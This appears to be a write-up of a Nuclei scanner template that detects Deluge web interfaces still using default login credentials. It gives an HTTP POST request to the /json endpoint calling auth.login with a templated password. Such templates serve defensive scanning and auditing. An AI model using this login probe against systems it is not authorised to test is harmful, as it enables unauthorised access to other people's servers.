# Nuclei Template: Deluge - Default Login
**Template ID:** deluge-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`deluge-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Deluge Default login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /json HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"method":"auth.login","params":["{{password}}"],"id":51}
```

## References
- https://docs.linuxserver.io/images/docker-deluge/#:~:text=The%20admin%20interface%20is%20available,%2D%3EInterface%2D%3EPassword.
